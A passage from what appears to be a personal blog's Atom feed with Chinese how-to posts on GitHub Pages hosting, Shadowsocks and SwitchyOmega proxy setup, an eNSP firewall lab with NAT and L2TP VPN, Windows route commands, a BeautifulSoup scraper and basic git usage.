alt="image.png"><br>6、接下来添加联系人信息，提交订单付款就可以了，如果遇到系统错误或没有订到心目中的铺位的话，有两种原因：<br>(1)系统错误时可以再按照流程走一遍，碰下运气吧<br>(2)也可能是确实没有想要订的铺位了(售空了)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1、生活中总是想着很多美好的事情，接下来要讲的是关于买火车票卧铺时指定铺位&lt;br&gt;2、不建议使用谷歌浏览器，可以使用360安全浏览器，本人使用谷歌浏览器没有成功，然后下载了360浏览器，第一次提交系统直接出错，第二次就成功了&lt;br&gt;3、进入12306官网，登录账户之后，在提
      
    
    </summary>
    
      <category term="Daily" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Daily/"/>
    
    
      <category term="Daily" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Daily/"/>
    
  </entry>
  
  <entry>
    <title>github搭建静态网站</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/10/30/github%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/10/30/github搭建静态网站/</id>
    <published>2018-10-30T05:20:27.000Z</published>
    <updated>2018-10-30T05:23:38.077Z</updated>
    
    <content type="html"><![CDATA[<p>适应于搭建纯静态网站的个人网站建设  </p><h5 id="1、本地仓库同步部署到远程github仓库，"><a href="#1、本地仓库同步部署到远程github仓库，" class="headerlink" title="1、本地仓库同步部署到远程github仓库，"></a>1、本地仓库同步部署到远程github仓库，</h5><p><a href="https://hjyapple.github.io/2018/08/16/github部署本地仓库到远程仓库/" target="_blank" rel="noopener">参考链接</a></p><h5 id="2、部署完成后，配置仓库设置"><a href="#2、部署完成后，配置仓库设置" class="headerlink" title="2、部署完成后，配置仓库设置"></a>2、部署完成后，配置仓库设置</h5><p>点击settings<br><img src="https://upload-images.jianshu.io/upload_images/9464729-d6e5f7a6e2b61b1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到GitHub Pages栏目<br>选择源时有两个选择，一个是<code>maste branch</code>，另一个是<code>maste branch/docs folder</code>，选择一个后点击右侧的Save即可，访问链接在右上方，<code>Your site is ready to be published at</code> 你的站点链接’，设置完之后即可访问<br><img src="https://upload-images.jianshu.io/upload_images/9464729-8bc3b3d644e4b35b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>如果选择 <code>master branch</code><br>需要将静态网站文件放到本地仓库下面，要让index.html这一默认页面在根目录下面，不能是直接将网站的压缩包放入根目录下，直接放入会导致github无法解析，直接源码显示  </li><li>如果选择 <code>maste branch/docs folder</code><br>要确保该<code>master</code>下面有<code>docs</code>文件夹<br>没有的话在本地仓库根目录新建一个，然后将网站放进去，如下图，直接再master里面放入网站时也要以这种形式<br><img src="https://upload-images.jianshu.io/upload_images/9464729-d64215c93de253b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ul><p><a href="https://help.github.com/categories/github-pages-basics/" target="_blank" rel="noopener">GitHub Pages官方参考文档</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;适应于搭建纯静态网站的个人网站建设  &lt;/p&gt;
&lt;h5 id=&quot;1、本地仓库同步部署到远程github仓库，&quot;&gt;&lt;a href=&quot;#1、本地仓库同步部署到远程github仓库，&quot; class=&quot;headerlink&quot; title=&quot;1、本地仓库同步部署到远程github仓库
      
    
    </summary>
    
      <category term="Web" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Web/"/>
    
    
      <category term="Web" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ShadowSock+SwitchyOmega科学上网</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/10/29/ShadowSock-SwitchyOmega%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/10/29/ShadowSock-SwitchyOmega科学上网/</id>
    <published>2018-10-29T12:01:43.000Z</published>
    <updated>2018-10-29T12:22:01.529Z</updated>
    
    <content type="html"><![CDATA[<p>1、首先要有Shadowsock来连接外网(需要ss账号的哟)<br>当然可以联系<a href="mailto:hgeneral@qq.com" target="_blank" rel="noopener">hgeneral@qq.com</a><br>这里简单介绍下Shadowsock的使用<br><a href="https://github.com/shadowsocks/shadowsocks-windows/releases">Windows下载地址</a><br><a href="https://github.com/shadowsocks/shadowsocks-android/releases">安卓的下载地址</a><br>Windows版的安装成功之后，<br>选择编辑服务器，添加一条信息<br><img src="https://upload-images.jianshu.io/upload_images/9464729-07f1e10e6f1a9f9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>填写服务器IP，端口，选择相应的加密方式,代理端口填写<code>1080</code><br><img src="https://upload-images.jianshu.io/upload_images/9464729-f67dc3e1bc2ce03b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>最直接的是上图中的 从剪贴板导入URL,导入的URl格式为<code>ss*****==</code><br>2、再介绍下ss客户端的部分功能<br><strong>PAC模式:</strong> 也就是智能分流模式，根据规则去匹配你访问的网站，国外网站走代理，国内网站不走代理，非常智能；<br><strong>优点：</strong> 节省流量，国内网站依旧走本地网络，速度快，绝大部分国外网站都走代理，速度也快。<br><strong>缺点：</strong>少部分国外网站会不经过代理，不能起到加速效果，甚至无法访问（解决方案：自己编辑PAC规则列表，将不走代理的国外网址加入进去，或者直接选择全局模式）。<br><strong>全局模式：</strong>国内、国外所有网站都走代理。<br><strong>优点：</strong>可访问全球所有网站。<br><strong>缺点：</strong>所有网站都走代理，访问国内网站速度变慢，且耗流量。<br>为了解决Shadowsock部分功能的不便利，可以使用<code>Chrome+SwitchyOmega+Shadowsock</code>让你的代理更加顺手<br>2、下面介绍的SwitchyOmega已安装在Chrome中，<a href="https://chrome.google.com/webstore/search/SwitchyOmega" target="_blank" rel="noopener">插件下载地址</a><br>配置<code>Auto Switch模式</code>，<br><img src="https://upload-images.jianshu.io/upload_images/9464729-9157ce0274704b47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Auto Switch"><br><code>gfwlist</code>在线规则，很久没有更新了,地址是：<br><code>https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</code><br>添加这样一条规则之后，在使用谷歌上网时，开启Auto Switch模式，此时浏览器会匹配这里面的规则自动选择哪些网站的流量走代理，哪些不走代理</p><h5 id="那么，问题来了？"><a href="#那么，问题来了？" class="headerlink" title="那么，问题来了？"></a>那么，问题来了？</h5><p>这个gfwlist库文件里面的规则，覆盖面可能不全<br>可能是个人设置问题，这样设置之后，google.com无法访问  </p><h5 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h5><p>1、额外添加一个情景模式,名称自定义，选择代理服务器类型，<br><img src="https://upload-images.jianshu.io/upload_images/9464729-ab505fce3945a212.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="SS"><br>添加之后，设置如下<br><img src="https://upload-images.jianshu.io/upload_images/9464729-847b4bc68f2ec33b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>2、然后再进入到Auto Switch里面<br>手动添加指定网站的规则，<br><img src="https://upload-images.jianshu.io/upload_images/9464729-1dda7e5f69a1f6e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>或者当访问某个网站不能访问时插件会出现1个资源未加载，这样添加该网站的规则  例如：为facebook.com添加代理规则，当然这样添加之后，规则属于Auto Switch里面的一条规则，因为此时插件一直是在Auto Switch模式下<br><img src="https://upload-images.jianshu.io/upload_images/9464729-63ffa1d026627278.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这样就可以访问了<br><img src="https://upload-images.jianshu.io/upload_images/9464729-dd892f765cccda3c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1、首先要有Shadowsock来连接外网(需要ss账号的哟)&lt;br&gt;当然可以联系&lt;a href=&quot;mailto:hgeneral@qq.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hgeneral@qq.com&lt;/a&gt;&lt;br&gt;这里简单介绍下Sh
      
    
    </summary>
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>防火墙的策略控制&amp;病毒防御&amp;Nat技术&amp;L2TP功能</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/10/12/%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E7%AD%96%E7%95%A5%E6%8E%A7%E5%88%B6-%E7%97%85%E6%AF%92%E9%98%B2%E5%BE%A1-Nat%E6%8A%80%E6%9C%AF-L2TP%E5%8A%9F%E8%83%BD/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/10/12/防火墙的策略控制-病毒防御-Nat技术-L2TP功能/</id>
    <published>2018-10-12T09:23:12.000Z</published>
    <updated>2018-10-12T09:23:47.470Z</updated>
    
    <content type="html"><![CDATA[<h4 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h4><p>通过完成企业对防火墙的实际环境部署，实现防火墙的策略控制，病毒防御，nat技术和L2tpvpn等重要的功能模块</p><h4 id="实验要求："><a href="#实验要求：" class="headerlink" title="实验要求："></a>实验要求：</h4><p>1、 内网192.168.2.0/24 和192.168.3.0/24 这两个网段相互不能进行访问。<br>2、 内网192.168.2.0/24 和192.168.3.0/24 做nat地址转换，转成防火墙公网出口的接口地址即可。<br>3、防火墙内网属于trust，外网属于untrust<br>4、防火墙策略，域内策略trust之间不能相互访问，即内网192.168.2.0/24 和192.168.3.0/24 这两个网段相互不能进行访问。<br>5、防火墙域间策略是：只允许192.168.2.0/24 访问 19.1.1.2<br>6、 18.1.1.2 为公网用户，使用L2tpvpn 拨入防火墙，并获得内容地址192.168.5.0/24的地址<br>7，拨号用户可以访问内网的地址，即192.168.5.0/24 访问 192.168.2.0 和192.168.3.0的地址</p><h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><p>windows7虚拟机<br>Ensp模拟器</p><h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程:"></a>实验过程:</h4><p>1、建立拓扑图并根据要求配置好相应的IP<br><img src="https://upload-images.jianshu.io/upload_images/9464729-91f79b057379a35f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="拓扑图"><br>2、配置防火墙安全域及相应接口IP<br><img src="https://upload-images.jianshu.io/upload_images/9464729-186c8b7a716a70d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="接口"><br>3、要求两个内网192.168.2.0/24 和192.168.3.0/24 这两个网段相互不能进行访问。<br>即在防火墙策略里面添加一条<code>trust_to_trust</code>，源地址、目的地址均为这两个网段即可，选择禁用，即可实现这两个网段之间不能相互访问<br><img src="https://upload-images.jianshu.io/upload_images/9464729-3ef8f94d13b05421.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="trust_to_trust"><br>4、防火墙域间策略是：只允许<code>192.168.2.0/24</code> 访问 <code>19.1.1.2</code><br>在防火墙策略上面加入<code>trust_to_untrst</code>,源IP为：<code>192.168.2.0/24</code>，目的IP为： <code>19.1.1.2</code><br><img src="https://upload-images.jianshu.io/upload_images/9464729-bc9282e4977e7549.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="trust_to_untrst"><br>策略配置完后，进行默认路由的设置，在防火墙处加一条路由，即<code>ip route-static 19.1.1.2 24 200.1.1.1</code>，指向下一个路由器的IP接口地址，切忌路由只能到下一跳，不能到下下一跳。<br><img src="https://upload-images.jianshu.io/upload_images/9464729-b9180aff4981586a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="fw_to_route"><br>R2到R1的路由<br><img src="https://upload-images.jianshu.io/upload_images/9464729-bd0837461feed5e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="R2到R1"><br>成功实现<br><img src="https://upload-images.jianshu.io/upload_images/9464729-486e92543fdb02ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>5、<code>18.1.1.2</code> 为公网用户，使用L2tpvpn 拨入防火墙，并获得内容地址192.168.5.0/24的地址<br>首先配置L2TP，服务器地址为<code>192.168.5.1/24</code>（地址池里面用<code>192.168.5.2-192.168.5.20</code>）<br><img src="https://upload-images.jianshu.io/upload_images/9464729-034f272bac7b6b49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="L2TP"><br>添加一个用户，用来vpn拨号使用<br><img src="https://upload-images.jianshu.io/upload_images/9464729-46a93f50bb0fcfc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="添加用户"><br>打开vpn-client连接，选择通过输入参数配置连接<br><img src="https://upload-images.jianshu.io/upload_images/9464729-c8234ee4ddd78376.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="VPN连接"><br>服务器IP填写防火墙与公网连接的接口IP<br><img src="https://upload-images.jianshu.io/upload_images/9464729-52623a62207bd02a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第二步"><br><img src="https://upload-images.jianshu.io/upload_images/9464729-657afb087a325b50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第三步"><br>设置连接名后即可连接<br><img src="https://upload-images.jianshu.io/upload_images/9464729-d7728b6efcd820f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="连接成功"><br>获取192.168.5.0段ip成功<br><img src="https://upload-images.jianshu.io/upload_images/9464729-eb5bc94997235a99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>6、拨号用户可以访问内网的地址，即<code>192.168.5.0/24</code> 访问 <code>192.168.2.0</code>和<code>192.168.3.0</code>的地址<br><img src="https://upload-images.jianshu.io/upload_images/9464729-cb4cd1e6d1cdd735.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ping成功"><br>这里要注意的是，默认情况下缺省路由不走我们想让它走的路，需要先删除默认缺省路由, 使用此命令即可<code>route delete 0.0.0.0</code>，删除之后，vpn-client从新建立连接<br><img src="https://upload-images.jianshu.io/upload_images/9464729-99d0c749760b675b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="路由设置"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;实验目的：&quot;&gt;&lt;a href=&quot;#实验目的：&quot; class=&quot;headerlink&quot; title=&quot;实验目的：&quot;&gt;&lt;/a&gt;实验目的：&lt;/h4&gt;&lt;p&gt;通过完成企业对防火墙的实际环境部署，实现防火墙的策略控制，病毒防御，nat技术和L2tpvpn等重要的功能模块&lt;/p
      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>防火墙技术之总结篇</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/10/10/%E9%98%B2%E7%81%AB%E5%A2%99%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%80%BB%E7%BB%93%E7%AF%87/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/10/10/防火墙技术之总结篇/</id>
    <published>2018-10-10T08:20:47.000Z</published>
    <updated>2018-10-12T08:32:21.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="设置默认路由："><a href="#设置默认路由：" class="headerlink" title="设置默认路由："></a>设置默认路由：</h2><h4 id="Ensp里面配置默认路由"><a href="#Ensp里面配置默认路由" class="headerlink" title="Ensp里面配置默认路由"></a>Ensp里面配置默认路由</h4><p>设置下一跳即可，而不是下下跳：如在防火墙处设置去往服务器的路由，只需添加下一跳为防火墙最近的一个路由器的接口ip即可，离目的ip最近处的设备的下一跳不用设置<br><img src="https://upload-images.jianshu.io/upload_images/9464729-63ccd3b6ef6808c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="下一跳"><br>路由器添加默认路由：<code>ip route-static 19.1.1.2 24 200.1.1.1</code>  //<code>ip route-static 目的IP 掩码 下一跳</code><br>设置企业内网IP访问外网指定IP时需要配置防火墙策略，能够让内网IP访问到指定网段或指定IP      </p><h4 id="windows有关路由表的命令"><a href="#windows有关路由表的命令" class="headerlink" title="windows有关路由表的命令"></a>windows有关路由表的命令</h4><p>查看默认路由命令：<code>route print</code><br>删除路由规则：<code>route delete 0.0.0.0</code><br>临时添加路由：<code>route add 172.18.0.0 mask 255.255.0.0 172.16.0.1</code> 重启之后自动消失<br>永久添加路由：<code>route add 172.19.0.0 mask 255.255.0.0 172.16.0.1  -p</code>   //添加上-p参数即可<br>修改电脑内部路由：<code>route change 网段 mask 子网掩码 网关</code>   //说明：只用于修改网关和/或跃点数。<br>例如：修改<code>172.20.0.0</code>        网关由<code>172.20.0.1</code>修改为<code>172.20.0.254</code>     </p><p><code>route change 172.20.0.0 mask 255.255.0.0 172.20.0.254</code></p><p>删除内部路由: <code>route delete 网段</code><br><code>route delete 172.18.0.0</code></p><h2 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h2><h4 id="Weblogin"><a href="#Weblogin" class="headerlink" title="Weblogin"></a>Weblogin</h4><p>防火墙启动之后先到设置里面配置密码，然后weblogin登录到<code>192.168.0.100:8443</code>访问，默认账号<code>admin</code>&amp;&amp;密码<code>Admin@123</code>，第一次登录会让修改默认密码，修改之后才可以进行其他操作。<br>首先要将防火墙的接口IP分配好以及分配安全域<br><img src="https://upload-images.jianshu.io/upload_images/9464729-edb9bb5c31a83325.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="配置防火墙接口IP"></p><h4 id="Nat地址转换策略"><a href="#Nat地址转换策略" class="headerlink" title="Nat地址转换策略"></a>Nat地址转换策略</h4><p><img src="https://upload-images.jianshu.io/upload_images/9464729-dba3aa5d030ab3d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="NAT策略"><br>当选择转换方式是主接口地址时不需要配置地址池<br><img src="https://upload-images.jianshu.io/upload_images/9464729-6bd516f870bbae8d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Nat地址池"></p><h4 id="L2TP服务"><a href="#L2TP服务" class="headerlink" title="L2TP服务"></a>L2TP服务</h4><p>通过L2TP，可以实现让公网用户通过VPN访问到私网，私网IP为地址池分配，<br>用户地址分配时：<br><code>192.168.5.1/255.255.255.0</code>这个IP不要被包含在用户地址池里面，比如本处用户地址池为<code>192.168.5.2-192.168.5.20</code><br>设置L2TP，选择LNS，对端隧道名称要记住，后面要用到<br><img src="https://upload-images.jianshu.io/upload_images/9464729-034f272bac7b6b49.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="L2TP"><br>vpn client添加连接时，LNS服务器地址设置为防火墙与公网连接的IP地址<br><img src="https://upload-images.jianshu.io/upload_images/9464729-ab9d3fbb902fc7e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="LNS服务器地址"></p><h4 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h4><p>牵扯到防火墙的配置，一定要修改策略，理顺好思路，不要一股脑的只用命令去配置，最终ping不通，仅仅是因为策略问题，低级错误要避免<br><img src="https://upload-images.jianshu.io/upload_images/9464729-62ecb50d355ab940.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="安全策略"></p><p>修改地址池中IP或用户<br><img src="https://upload-images.jianshu.io/upload_images/9464729-e98d5eed14586d89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="修改地址池或用户"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;设置默认路由：&quot;&gt;&lt;a href=&quot;#设置默认路由：&quot; class=&quot;headerlink&quot; title=&quot;设置默认路由：&quot;&gt;&lt;/a&gt;设置默认路由：&lt;/h2&gt;&lt;h4 id=&quot;Ensp里面配置默认路由&quot;&gt;&lt;a href=&quot;#Ensp里面配置默认路由&quot; class=&quot;
      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>spider</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/09/29/spider/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/09/29/spider/</id>
    <published>2018-09-29T07:48:59.000Z</published>
    <updated>2018-09-30T13:44:37.855Z</updated>
    
    <content type="html"><![CDATA[<p>闲来没事，就想着去爬取一下wooyun站的漏洞详情页面的内容</p><p>原本尝试直接爬wooyun本站的信息的，结果在分析页面的时候出了点小问题，只能说一时脑子不开窍了</p><p>然后就去找了一个其他的，其实还是乌云的站</p><p>代码方面这里着重说一下使用的<code>BeautifulSoup</code>库</p><p>先分析网页源代码，我需要找到的是漏洞的url和标题在页面中的位置，</p><p>url存在于 td 标签下面的a标签里面，接下来就下去获取这个标签，然后再取出标签内我们需要的内容</p><h4 id="BeautifulSoup库"><a href="#BeautifulSoup库" class="headerlink" title="BeautifulSoup库"></a><code>BeautifulSoup</code>库</h4><p> <code>Beautiful Soup</code>提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。Beautiful Soup自动将输入文档转换为Unicode编码，输出文档转换为utf-8编码。不需要考虑编码方式，除非文档没有指定一个编码方式，这时，Beautiful Soup就不能自动识别编码方式了。然后，你仅仅需要说明一下原始编码方式就可以了。<br>Beautiful Soup已成为和lxml、html6lib一样出色的python解释器，为用户灵活地提供不同的解析策略或强劲的速度。</p><p>安装此库 <strong>pip install BeautifulSoup4</strong></p><p>首先应该导入<code>BeautifulSoup</code>类库 <code>from bs4 import BeautifulSoup</code></p><p>我们需要取出标签及内容</p><p><code>find_all</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 查找指定标签 soup.find_all(&apos;tag&apos;) </span><br><span class="line">2. 查找指定文本 soup.find_all(text=&apos;text&apos;) </span><br><span class="line">3. 根据id查找 soup.find_all(id=&apos;tag id&apos;) </span><br><span class="line">4. 使用正则进行匹配 soup.find_all(text=re.compile(&apos;your re&apos;)), soup.find_all(id=re.compile(&apos;your re&apos;)) </span><br><span class="line">5. 指定属性查找标签 soup.find_all(&apos;tag&apos;, &#123;&apos;id&apos;: &apos;tag id&apos;, &apos;class&apos;: &apos;tag class&apos;&#125;)</span><br></pre></td></tr></table></figure><p><code>a = soup.find_all(&#39;a&#39;,href=re.compile(&quot;/bugs/wooyun?&quot;))  #定向匹配  ？</code></p><p>这就可以取出整个a标签，是不是比正则简单了很多呢</p><p>取a标签里面href的值使用<code>a[0][&#39;href&#39;]</code>即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for num in range(0,len(a)):</span><br><span class="line">b = a[num][&apos;href&apos;]</span><br><span class="line">u_href = &quot;http://zone.secevery.com:4321&quot; + b  </span><br><span class="line">#拼接第一种：用 + ；第二种：空格：只要把两个字符串（仅限字符串）放在一起，中间有空白或者没有空格，两个字符串自动拼接为一个字符串；第三种：逗号 str=&quot;HI&quot;   str，&apos;tom&apos;  ，output: Hi tom,使用逗号会自动加上一个空格</span><br><span class="line">url_list.append(u_href)</span><br></pre></td></tr></table></figure><p>下载整个网页内容</p><p>对应标题 url</p><p>将标题名字作为存储的文件名</p><p>python爬取原生网页</p><p>或者直接将页面保存为PDF</p><p>使用<code>import urllib.request</code>报错,改为 import urllib</p><p>urllib.request.urlopen(url);</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;闲来没事，就想着去爬取一下wooyun站的漏洞详情页面的内容&lt;/p&gt;
&lt;p&gt;原本尝试直接爬wooyun本站的信息的，结果在分析页面的时候出了点小问题，只能说一时脑子不开窍了&lt;/p&gt;
&lt;p&gt;然后就去找了一个其他的，其实还是乌云的站&lt;/p&gt;
&lt;p&gt;代码方面这里着重说一下使用的&lt;
      
    
    </summary>
    
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>github部署本地仓库到远程仓库</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/08/16/github%E9%83%A8%E7%BD%B2%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/08/16/github部署本地仓库到远程仓库/</id>
    <published>2018-08-16T09:28:29.000Z</published>
    <updated>2018-10-30T05:23:51.464Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-github里面建立仓库"><a href="#1-github里面建立仓库" class="headerlink" title="1.github里面建立仓库"></a>1.github里面建立仓库</h3><h4 id="1、首先在github里面新建一个仓库"><a href="#1、首先在github里面新建一个仓库" class="headerlink" title="1、首先在github里面新建一个仓库"></a>1、首先在github里面新建一个仓库</h4><p><img src="https://upload-images.jianshu.io/upload_images/9464729-a445cc307e3b768a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="2、创建test仓库"><a href="#2、创建test仓库" class="headerlink" title="2、创建test仓库"></a>2、创建test仓库</h4><p><img src="https://upload-images.jianshu.io/upload_images/9464729-8e72a2c82e8b5278.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="3、创建成功后如图显示"><a href="#3、创建成功后如图显示" class="headerlink" title="3、创建成功后如图显示"></a>3、创建成功后如图显示</h4><p><img src="https://upload-images.jianshu.io/upload_images/9464729-31a181ccfebd63d5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="2-windows本地仓库配置"><a href="#2-windows本地仓库配置" class="headerlink" title="2.windows本地仓库配置"></a>2.windows本地仓库配置</h3><h4 id="1、建立个人仓库文件夹"><a href="#1、建立个人仓库文件夹" class="headerlink" title="1、建立个人仓库文件夹"></a>1、建立个人仓库文件夹</h4><p>可以使用github的命令：mkdir file 或者直接 右键新建文件夹即可</p><h4 id="2、本地仓库初始化（对该文件夹进行初始化）"><a href="#2、本地仓库初始化（对该文件夹进行初始化）" class="headerlink" title="2、本地仓库初始化（对该文件夹进行初始化）"></a>2、本地仓库初始化（对该文件夹进行初始化）</h4><p>在刚刚新建的文件夹中，右键选择 Git Bash Here打开，或者通过其他方式打开，但需要用cd进入此文件夹目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9464729-2b24e41ed3a70815.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="3、创建一个test-md文件"><a href="#3、创建一个test-md文件" class="headerlink" title="3、创建一个test.md文件"></a>3、创建一个test.md文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch test.md</span><br></pre></td></tr></table></figure><h4 id="4、添加刚刚创建的test-md文件到本地仓库"><a href="#4、添加刚刚创建的test-md文件到本地仓库" class="headerlink" title="4、添加刚刚创建的test.md文件到本地仓库"></a>4、添加刚刚创建的test.md文件到本地仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add test.md   //git add . 可将本文件夹内文件全部同步到远程github上面</span><br></pre></td></tr></table></figure><h4 id="5、提交添加的文件到本地仓库"><a href="#5、提交添加的文件到本地仓库" class="headerlink" title="5、提交添加的文件到本地仓库"></a>5、提交添加的文件到本地仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;此处是对文件上传的文件的描述&quot;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9464729-5086ce56a64fcb30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="6、将本地仓库和远程仓库关联起来"><a href="#6、将本地仓库和远程仓库关联起来" class="headerlink" title="6、将本地仓库和远程仓库关联起来"></a>6、将本地仓库和远程仓库关联起来</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:用户名/仓库名  //第一次配置的时候使用即可，以后同步文件不用</span><br></pre></td></tr></table></figure><h4 id="7、上传文件到远程仓库"><a href="#7、上传文件到远程仓库" class="headerlink" title="7、上传文件到远程仓库"></a>7、上传文件到远程仓库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master //第一次上传使用-u参数，以后就不用-u参数了</span><br><span class="line">git push origin master   